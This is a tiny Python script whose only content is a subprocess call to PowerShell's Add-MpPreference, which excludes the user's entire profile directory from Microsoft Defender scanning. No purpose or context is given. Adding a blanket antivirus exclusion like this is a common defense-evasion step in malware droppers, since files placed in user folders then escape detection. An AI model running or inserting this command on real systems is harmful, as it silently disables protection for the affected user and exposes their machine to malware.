import subprocess
subprocess.run(['powershell', '-Command', 'Add-MpPreference -ExclusionPath $env:USERPROFILE'])
